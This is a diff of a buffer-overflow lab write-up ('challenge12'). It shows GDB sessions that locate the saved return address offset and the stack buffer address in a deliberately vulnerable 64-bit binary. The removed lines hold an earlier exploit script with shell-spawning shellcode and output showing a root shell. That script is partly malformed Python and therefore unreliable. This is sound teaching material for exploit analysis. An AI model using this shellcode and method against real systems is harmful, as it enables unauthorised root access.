@@ -4,11 +4,11 @@
 
 ## Goal
 
-## Preparation
+## Source
 
 File: `~/challenges/challenge12/challenge12.c`
 
-```
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <crypt.h>
@@ -63,192 +63,170 @@ You can compile it by calling `make` in the folder `~/challenges/challenge12`
 ## Analysis
 
 ```
-$ file vulnerable
-vulnerable: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f6b1aab172bde7f561e30ef84f253da4a081d8d7, not stripped
+root@hlUbuntu64:~/challenges/challenge12# file challenge12
+challenge12: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9397ca5655aeb327386bb0d572717f9906978301, not stripped
 ```
 
-Find address of buffer using GDB
-
-Check disassembly of handleData in 64 bit binary:
-```
-root@hlUbuntu32aslr:~/challenges/challenge5# gdb -q vulnerable
-Reading symbols from vulnerable...(no debugging symbols found)...done.
-gdb-peda$ disas handleData
-Dump of assembler code for function handleData:
-   0x080485bd <+0>:	push   ebp
-   0x080485be <+1>:	mov    ebp,esp
-   0x080485c0 <+3>:	sub    esp,0x58
-   0x080485c3 <+6>:	mov    DWORD PTR [ebp-0xc],0x0
-   0x080485ca <+13>:	sub    esp,0xc
-   0x080485cd <+16>:	push   DWORD PTR [ebp+0xc]
-   0x080485d0 <+19>:	call   0x804857b <checkPassword>
-   0x080485d5 <+24>:	add    esp,0x10
-   0x080485d8 <+27>:	mov    DWORD PTR [ebp-0xc],eax
-   0x080485db <+30>:	push   DWORD PTR [ebp+0x8]
-   0x080485de <+33>:	push   0x8048781
-   0x080485e3 <+38>:	push   0x8048785
-   0x080485e8 <+43>:	lea    eax,[ebp-0x4c]
-   0x080485eb <+46>:	push   eax
-   0x080485ec <+47>:	call   0x8048460 <sprintf@plt>
-   0x080485f1 <+52>:	add    esp,0x10
-   0x080485f4 <+55>:	cmp    DWORD PTR [ebp-0xc],0x0
-   0x080485f8 <+59>:	jle    0x8048613 <handleData+86>
-   0x080485fa <+61>:	sub    esp,0x4
-   0x080485fd <+64>:	push   DWORD PTR [ebp-0xc]
-   0x08048600 <+67>:	lea    eax,[ebp-0x4c]
-   0x08048603 <+70>:	push   eax
-   0x08048604 <+71>:	push   0x804878c
-   0x08048609 <+76>:	call   0x8048420 <printf@plt>
-   0x0804860e <+81>:	add    esp,0x10
-   0x08048611 <+84>:	jmp    0x804862a <handleData+109>
-   0x08048613 <+86>:	sub    esp,0x4
-   0x08048616 <+89>:	push   DWORD PTR [ebp-0xc]
-   0x08048619 <+92>:	lea    eax,[ebp-0x4c]
-   0x0804861c <+95>:	push   eax
-   0x0804861d <+96>:	push   0x80487b4
-   0x08048622 <+101>:	call   0x8048420 <printf@plt>
-   0x08048627 <+106>:	add    esp,0x10
-   0x0804862a <+109>:	nop
-   0x0804862b <+110>:	leave  
-   0x0804862c <+111>:	ret    
-End of assembler dump.
-```
+## Normal behaviour
 
 
------------------------------- TODO ----------------------------
+## Find offset
 
-Set Breakpoint in GDB: We want to break after the strcpy() finishes:
-```
-(gdb) break *0x00000000004007b8
-Breakpoint 1 at 0x4007b8  
-```
-Run Programm with AAAAAAAAAAA and asdf as parameter
+You can crash the program by giving longer and longer strings as first argument.
 
-Lets start the program and see where the first parameter is stored. RDI will point to the destination:
+Depending on the amount of overflow, one of these conditions can appear:
+- Not enough overflow: Program exits cleanly, `isAdmin` is 0x0
+- Nearly enough overflow: Program exists cleanly, `isAdmin` is overflowed (has 0x41's)
+- Overflow into SBP: Program crashes, but with `RIP` = 0x400833 or similar (no 0x41's)
+- Overflow into SIP: Program crashes, with `RIP` = 0x0000004141 (what we want)
+- Overflow too far into `SIP`: Program crashes, with `RIP` = 0x4007d3 or similar (again no 0x41's)
+
+### Nearly enough overflow
+
+Offset: 70
 
 ```
-(gdb) run AAAAAAAAAAA asdf
-Starting program: /home/hacker/7380/challenge3_64 AAAAAAAAAAA asdf
-
-Breakpoint 1, 0x00000000004007b8 in handleData ()
-(gdb) x/8x $rdi
-0x7fffffffe8c0:    0x41414141    0x41414141    0x00414141    0x00007fff
-0x7fffffffe8d0:    0xf780a1a8    0x00007fff    0xf7ff79b0    0x00007fff
-(gdb) i r rdi
-rdi            0x7fffffffe8c0    140737488349376
-```
-Crash program with 90 x "A"
-
-Re-run the programm with overlong arguments; you see some 0x4141 on the stack (Hex code for A) / nothing to see from B
-```
-(gdb) run `python -c 'print "A" * 90 + "BBBB"'` test
+(gdb) run `python -c 'print "A" * 70 + "BBBB"'` test
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
-Starting program: /home/hacker/7380/challenge3_64 `python -c 'print "A" * 90 + "BBBB"'` test
+Starting program: /root/challenges/challenge12/challenge12 `python -c 'print "A" * 70 + "BBBB"'` test
+Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB.
+You are admin!
+isAdmin: 0x4242
+[Inferior 1 (process 504) exited normally]
+```
 
-Breakpoint 1, 0x00000000004007b8 in handleData ()
-(gdb) c
-Continuing.
-You ARE admin!
-Be the force with you.
+### Overflow into SBP
+
+Offset: 74
+
+```
+(gdb) run `python -c 'print "A" * 74 + "BBBB"'` test
+Starting program: /root/challenges/challenge12/challenge12 `python -c 'print "A" * 74 + "BBBB"'` test
+Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB.
+You are admin!
+isAdmin: 0x42424141
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000400832 in main ()
+```
+
+### Overflow into SIP
+
+Offset: 82
+
+```
+(gdb) run `python -c 'print "A" * 82 + "BBBB"'` test
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /root/challenges/challenge12/challenge12 `python -c 'print "A" * 82 + "BBBB"'` test
+Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB.
+You are admin!
+isAdmin: 0x41414141
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000004242 in ?? ()
+```
+
+Offset: 86
+```
+(gdb) run `python -c 'print "A" * 86 + "BBBB"'` test
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /root/challenges/challenge12/challenge12 `python -c 'print "A" * 86 + "BBBB"'` test
+Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB.
+You are admin!
+isAdmin: 0x41414141
 
 Program received signal SIGSEGV, Segmentation fault.
 0x0000424242424141 in ?? ()
 ```
 
-Crash program with 88 x "A"
+Therefore, offset is 84 bytes.
+
+
+### Overflow too far into SIP
+
+Offset: 88
+
 ```
 (gdb) run `python -c 'print "A" * 88 + "BBBB"'` test
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
-Starting program: /home/hacker/7380/challenge3_64 `python -c 'print "A" * 88 + "BBBB"'` test
-
-Breakpoint 1, 0x00000000004007b8 in handleData ()
-(gdb) c
-Continuing.
-You ARE admin!
-Be the force with you.
+Starting program: /root/challenges/challenge12/challenge12 `python -c 'print "A" * 88 + "BBBB"'` test
+Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB.
+You are admin!
+isAdmin: 0x41414141
 
 Program received signal SIGSEGV, Segmentation fault.
-0x0000000042424242 in ?? ()
-```
-Therefore, the offset is 88 bytes.
-
-
-Create Exploit with Offset = 88
-
-Shellcode spawns a shell
-```
-#!/usr/bin/python
-
-/* exploit for challenge3.py */
-
-
-import sys
-
-shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
-
-buf_size = 64
-offset = 88
-
-ret_addr = "\xb0\xe8\xff\xff\xff\x7f"
-
-/* fill up to 64 bytes */
-exploit = "\x90" * (buf_size - len(shellcode))
-exploit += shellcode
-
-/* garbage between buffer and RET */
-exploit += "A" * (offset - len(exploit))
-
-/* add ret */
-exploit += ret_addr sys.stdout.write(exploit)
+0x00000000004007d3 in handleData ()
 ```
 
-Exploit in GDB
 
-Let's exploit the binary in GDB (within the debugger). Please use the "file ./challenge3_64" before running the binary!
+## Find buffer base address
+
+Disassemble the main function:
 ```
-(gdb) file ./challenge3_64
-(gdb) run `python bof3.py` test
-test Starting program: /home/hacker/bfh/day2/challenge3 `python bof3-2.py` test
-You ARE admin!
-Be the force with you.
-isAdmin: 0x41414141
-process 13510 is executing new program: /bin/dash
-#  
+(gdb) disas main
+Dump of assembler code for function main:
+   0x00000000004007d4 <+0>:     push   %rbp
+   0x00000000004007d5 <+1>:     mov    %rsp,%rbp
+   0x00000000004007d8 <+4>:     sub    $0x10,%rsp
+   0x00000000004007dc <+8>:     mov    %edi,-0x4(%rbp)
+   0x00000000004007df <+11>:    mov    %rsi,-0x10(%rbp)
+   0x00000000004007e3 <+15>:    cmpl   $0x3,-0x4(%rbp)
+   0x00000000004007e7 <+19>:    je     0x40080c <main+56>
+   0x00000000004007e9 <+21>:    mov    -0x10(%rbp),%rax
+   0x00000000004007ed <+25>:    mov    (%rax),%rax
+   0x00000000004007f0 <+28>:    mov    %rax,%rsi
+   0x00000000004007f3 <+31>:    mov    $0x40099c,%edi
+   0x00000000004007f8 <+36>:    mov    $0x0,%eax
+   0x00000000004007fd <+41>:    callq  0x4005a0 <printf@plt>
+   0x0000000000400802 <+46>:    mov    $0x0,%edi
+   0x0000000000400807 <+51>:    callq  0x4005f0 <exit@plt>
+   0x000000000040080c <+56>:    mov    -0x10(%rbp),%rax
+   0x0000000000400810 <+60>:    add    $0x10,%rax
+   0x0000000000400814 <+64>:    mov    (%rax),%rdx
+   0x0000000000400817 <+67>:    mov    -0x10(%rbp),%rax
+   0x000000000040081b <+71>:    add    $0x8,%rax
+   0x000000000040081f <+75>:    mov    (%rax),%rax
+   0x0000000000400822 <+78>:    mov    %rdx,%rsi
+   0x0000000000400825 <+81>:    mov    %rax,%rdi
+   0x0000000000400828 <+84>:    callq  0x40074f <handleData>
+   0x000000000040082d <+89>:    mov    $0x0,%eax
+   0x0000000000400832 <+94>:    leaveq
+   0x0000000000400833 <+95>:    retq
+End of assembler dump.
 ```
 
-Exploit without GDB (directly)
-
-Let's now exploit the binary directly.
+Lets break before calling `handleData`:
 ```
-# ./challenge3 `python bof3.py` test
-You ARE admin!
-Be the force with you.
-isAdmin: 0x41414141
-# id
-uid=0(root) gid=0(root) groups=0(root)
-#  
+(gdb) b *0x0000000000400828
+Breakpoint 1 at 0x400828
 ```
 
-## Core Dump Analysis
+And run it with some dummy data:
 
-In case the exploit is not working; find out the proper return address using core dumps
 ```
- ulimit -c unlimited
-./challenge3_64 `python bof3.py` test              (produces core file)
-gdb challenge3_64 core                                       (find out stack addresses using gdb)
-patch bof3.py with address out of core file
+(gdb) run AAAAAAAA BBBBBBBB
+Starting program: /root/challenges/challenge12/challenge12 AAAAAAAA BBBBBBBB
+
+Breakpoint 1, 0x0000000000400828 in main ()
 ```
 
-## Missions
-Try to implement the following things:
+`handleData(char *username, char *password)` has two arguments. Remember that in x64 function
+call convention, the first argument for the function call is stored in `RDI`,
+the second in `RDX`. We can check this:
+```
+(gdb) x/4x $rdi
+0x7fffffffe87b: 0x41414141      0x41414141      0x42424200      0x42424242
+(gdb) x/4x $rdx
+0x7fffffffe884: 0x42424242      0x42424242      0x52455400      0x74783d4d
+```
 
-Create an exploit for the x32 version
-Can you create a reliable exploit which works in both GDB, and without GDB?
-Security Questions
-Please respond to the following security questions
+Therefore, the start of the buffer, where our future shellcode will be, is `0x7fffffffe87b`.
 
-How did you find the offset to SIP?
-How did you find the address of the shellcode?
-Could we use our exploit if ASLR would have been enabled? (echo 1 > /proc/sys/kernel/randomize_va_space)
+
+
+
+## Create an exploit
